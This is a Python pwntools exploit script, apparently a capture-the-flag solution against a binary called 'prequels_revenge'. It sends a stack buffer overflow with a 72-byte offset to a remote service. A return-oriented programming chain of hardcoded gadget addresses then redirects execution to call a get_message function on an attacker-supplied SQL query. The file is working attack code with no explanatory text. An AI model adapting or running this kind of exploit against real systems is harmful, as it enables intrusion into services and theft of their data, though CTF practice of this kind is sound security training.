from pwn import ELF, process, ROP, remote, ssh, gdb, cyclic, cyclic_find, log, p64, u64, p32, u32
import sys

LOCAL_BIN = "./prequels_revenge"

if False:
    P = process(LOCAL_BIN)
    if True:
        gdb.attach(P.pid, """
b *main+118
b *get_message+240
b *get_message+133

display/i $pc
display/wx $rsp
c
""")
else:
    P = remote('10.10.1.12', 10990)

#P.sendline(cyclic(128))

offset = 72
rop_len = 0x100
addr = 0x640000

ELF_LOADED = ELF(LOCAL_BIN)
ROP_LOADED = ROP(ELF_LOADED)
pop_rsi = (ROP_LOADED.find_gadget(['pop rsi', 'ret']))[0]
pop_rcx = (ROP_LOADED.find_gadget(['pop rcx', 'ret']))[0]
get_message = ELF_LOADED.symbols["get_message"]

add_rax_rsi = 0x536c74 # add rax, rsi; ret; 
mov_rax_rbx_pop_rbx = 0x4fc512 # mov rax, rbx; pop rbx; ret;
mov_rdi_rax_call_rcx = 0x403586 # mov rdi, rax; call rcx; 
random_string = 0x40027c # GNU

query = b"SELECT message FROM messages;"
query = sys.argv[1].encode()

payload = b"A"*offset

payload += p64(mov_rax_rbx_pop_rbx) + p64(0) 
payload += p64(pop_rsi) + p64(0xFFFFFFFFFFFFFE98+rop_len)
payload += p64(add_rax_rsi)
payload += p64(pop_rsi) + p64(random_string)
payload += p64(pop_rcx) + p64(get_message) + p64(mov_rdi_rax_call_rcx)
 
payload += b"B"*(rop_len-len(payload))

payload += query


P.sendline(payload)
P.interactive()